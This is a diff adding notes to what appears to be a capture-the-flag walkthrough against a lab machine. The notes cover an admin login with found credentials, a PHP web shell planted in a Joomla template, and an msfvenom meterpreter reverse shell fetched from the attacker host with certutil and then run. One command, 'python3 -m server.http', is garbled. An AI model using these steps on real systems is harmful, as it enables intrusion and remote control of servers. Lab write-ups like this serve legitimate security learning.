@@ -384,4 +384,32 @@ Stopped: Thu Mar  7 11:32:40 2024
 
 using administrator and playboy69 creds to enter /administrator to enter admin dashboard
 
+in system we can change the cassiopeia templates
 
+adding the one of the php:
+
+echo(system($_GET[0]));
+die;
+
+in url we enter:
+10.10.11.3/templates/cassiopeia/component.php?0= and the command we want to use
+
+using whoami and we get the responds:
+office\web_account
+
+crafting reverse shell:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f exe -o revs45.exe
+ and using msfconsole:
+ use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST
+set lport
+run
+
+set python3 -m server.http 80
+
+using certutil%20-urlcache%20-f%20http://10.10.16.125:80/revs45.exe%20revs45.exe in urlbased 
+
+downloading the file and now we run it
+
+start%20revs45.exe and we get the reverse shell
